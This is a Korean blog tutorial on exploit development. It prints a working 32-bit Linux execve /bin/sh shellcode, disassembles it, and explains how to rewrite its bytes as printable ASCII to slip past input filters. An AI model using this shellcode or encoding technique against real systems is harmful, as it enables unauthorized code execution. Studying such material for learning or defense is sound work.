---
layout: post
title: ! "Ascii Numeric ShellCode"
excerpt_separator: <!--more-->
comments : true
tags:
  - Shellcode
  - Ascii
  - t4ngo
---

제가 얼마 전에 아주 재밌게 보았던! Ascii ShellCode에 대해 설명하여 볼까 합니다. Ascii-Numeric-ShellCode란 출력 가능한 Ascii 문자들로 이루어진 쉘 코드를 뜻하며 다형성 쉘코드의 한 종류입니다!

출력 가능한 Ascii 문자들로 이루어진 쉘 코드가 무슨 말이냐?

지금부터 저와 함께 알아보시죠! GOGOGO~~!

<!--more-->

먼저, 우리가 흔히 알고 있는 Basic한 32-bit Shell code를 봐 볼까요?

- `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`

보통 우리는 Simple한 ShellCode Exploit을 할 때 보통 위와 같은 쉘 코드를 주로 사용합니다!

좀 더 보기 쉽게 disassemble 해 볼까요?

```
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  50                      push   eax
10: 89 e2                   mov    edx,esp
12: 53                      push   ebx
13: 89 e1                   mov    ecx,esp
15: b0 0b                   mov    al,0xb
17: cd 80                   int    0x80
```

Online Assembler로 간단하게 Disassemble하면 위와 같은 Assembly 코드를 볼 수가 있습니다.

```
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
```

코드를 보면 위 코드에서 스택에 0을 push합니다. 

```
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
```

그런 다음 현재 코드에서 스택에 "/bin//sh(0x68732f2f, 0x6e69622f)"을 push하는 것을 알 수 있죠?

```
d:  89 e3                   mov    ebx,esp
```

다시 코드를 쭈~욱 보면 아래 코드를 통해 스택에 궁극적으로 "/bin//sh"의 포인터를 ebx 레지스터에 넣습니다.

```
f:  50                      push   eax
10: 89 e2                   mov    edx,esp
```

그리고, 0을 edx 레지스터에 넣은 후

```
12: 53                      push   ebx
13: 89 e1                   mov    ecx,esp
```

ecx 레지스터에 "/bin//sh"이 저장된 곳의 포인터를 ecx 레지스터에 넣어 줍니다! 여기까지 잘 따라오셨나요?

```
15: b0 0b                   mov    al,0xb
17: cd 80                   int    0x80
```

그리고 마지막으로 al 레지스터에 0xb를 넣고 `'int 0x80'` 명령어를 통해 syscall을 수행하여 쨘~ 하고 쉘을 띄워줍니다!

여기까지가 보통 32-bit Shell Code입니다! 그렇다면!!! 드디어! Ascii-Numeric-ShellCode와는 무엇이 다른가?!

먼저, Ascii-Numeric-ShellCode는 위애서 설명했든 출력 가능한, printable한 hex 값들로 이루어진 Shellcode를 뜻합니다.

다시 위의 32-bit Shell Code를 봐 볼까요?

```
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  50                      push   eax
10: 89 e2                   mov    edx,esp
12: 53                      push   ebx
13: 89 e1                   mov    ecx,esp
15: b0 0b                   mov    al,0xb
17: cd 80                   int    0x80
```

- `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
`

현재의 hex 값에는 Ascii 코드로 표현하지 못하는 hex 값이 존재합니다! 즉, Ascii table에 없는 hex 값이라 printable하지 못하다는 것이겠죠?

![]({{ site.baseurl }}/images/t4ngo/Ascii-Numeric-ShellCode/Ascii_Numeric_ShellCode_01.png)

출력 가능한 Ascii table의 범위는 0x20 ~ 0x7F까지입니다. 즉, 이 범위 안에 해당하는 hex 값들만 Ascii-Numeric-ShellCode로 사용이 가능하다는 뜻이겠죠?

그렇다면, 여러분은 현재의 32-bit ShellCode에서 Ascii의 범위를 벗어난 hex들을 찾으셨나요?

Ascii-Numeric-ShellCode란 바로 이런 Asciiable 하지 않은 hex 코드들을 Asciiable하게 바꿔주어 모든 hex 값이 출력 가능한 Ascii 값을 가진 Shell Code를 말합니다!!

위 코드에서 Asciiable 하지 않은 코드들을 뽑아볼까요?

1. 
```
0:  31 c0                   xor    eax,eax
```

2. 
```
d:  89 e3                   mov    ebx,esp
```

3. 
```
10: 89 e2                   mov    edx,esp
```

4. 
```
13: 89 e1                   mov    ecx,esp
```

5. 
```
15: b0 0b                   mov    al,0xb
17: cd 80                   int    0x80
```

위와 같은 코드 부분들이 모두 Ascii Table의 범위를 벗어났죠? 나쁜 녀석들이에요 ㅠㅠ.

그럼 이 hex 값들을 어떻게 바꿔주냐!! 지금부터 주목해주세요!

```
0:  31 c0                   xor    eax,eax
```

이 코드는

```
0:  6a 77                   push   0x77
2:  58                      pop    eax
3:  34 77                   xor    al,0x77
```

쨘! 이렇게 바꿔 줄 수 있겠죠? 결과적으로 `'xor eax,eax'`가 하는 일은 eax 레지스터에 0을 담는 것이므로 코드를 아래와 같이 바꿔 줄 수 있어요! ㅎㅎ

또한, 그 때마다 Binary의 레지스터 상황을 보고 유연하게 쉘 코딩도 할 수 있죠!

예를 들면, 쉘 코드를 호출하기 직전에 eax 레지스터에 0x01이 들어있었다! 그러면 코드를 `'dec eax'`로 수정해주면 eax 레지스터는 0이 되겠죠? (오옹! >_O)

그 다음! mov 코드들은 어떻게 바꿔주냐! mov도 마찬가지로 push, pop으로 해결이 가능합니다! ㅎㅎ

2번 코드를 push, pop으로 구현하면...

```
0:  54                      push   esp
1:  5b                      pop    ebx
```

위와 같은 코드로 바꿀 수 있겠죠? 스택에 esp를 push하고 ebx로 pop을 해주면서 `'mov ebx, esp'`와 같은 동작을 하게 됩니다!

mov 명령들은 위와 같이 해결해 주면 되고!

```
17: cd 80                   int    0x80
```

다음은, syscall 부분! 사실 이 부분이 제일 핵심이죠! 왜냐? `'int 0x80'`은 대체 할 수 있는 명령어가 거의 없기 때문이죠 ㅠㅠ

그렇기 때문에 앞서 말해드렸던 스택에 이미 존재하는 레지스터 값을 이용하여 syscall을 호출 하여야 하는데요! 

음... 가령 예를 들면 xo 

ecx 레지스터에 0xFFFF 값이 들어있다면 이 값을 활용하여 `'xor ecx, 0x327F'`를 해줘서 `'cd 80'` hex를 만들어 준 뒤 이 값을 활용하여 eip에 넣어주도록 스택의 상황에 맞게 조작하여 주면 됩니다!

사실, 이 부분은 Binary 마다 호출 당시 스택의 상황이나 레지스터의 상황이 다 다르기 때문에 이런식으로 원리를 설명드리는 방법이 최선인 것 같아요 ㅠㅠ

이 외에도 레지스터나 스택에 남아 있는 값들을 활용하여 `'cd 80'`을 만들어 주면 되는데 핵심은 스택에 `'cd 80'`을 만들어 주고 그 값을 활용하여 syscall을 한다는 것만 기억하면 됩니다!

Ascii-Numeric-ShellCode를 만드는 것이 이렇게 해서 이렇게 하면 이렇게 돼! 하고 딱 정의 되어 있지 않고 그때그때 스택의 상황이나 레지스터의 상황을 보며 자신에게 가장 알맞는 코드를 선택하여 쉘 코딩해주면 되기 때문에 대략 이런 원리로 Ascii-Numeric-ShellCode가 만들어 진다는 점만 기억해주시면 될 것 같습니다!

이제 여러분의 레지스터나 스택 상황에 맞게 창의성을 발휘하여 Ascii-Numeric-ShellCode를 만들어 보세요~~!!! 화이팅!
